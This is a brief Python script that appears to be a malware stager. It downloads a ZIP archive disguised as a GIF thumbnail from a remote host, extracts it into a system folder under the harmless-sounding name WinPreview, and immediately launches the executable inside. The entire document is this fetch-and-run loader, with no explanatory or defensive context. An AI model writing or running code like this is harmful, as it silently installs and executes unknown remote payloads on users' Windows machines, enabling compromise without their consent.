from urllib.request import urlopen
import io
import os
import zipfile

STAGE = "https://cdn.invalid/previews/thumb.gif?width=64"
bundle = zipfile.ZipFile(io.BytesIO(urlopen(STAGE).read()))
bundle.extractall(r"C:\ProgramData\WinPreview")
os.startfile(r"C:\ProgramData\WinPreview\runtime.exe")
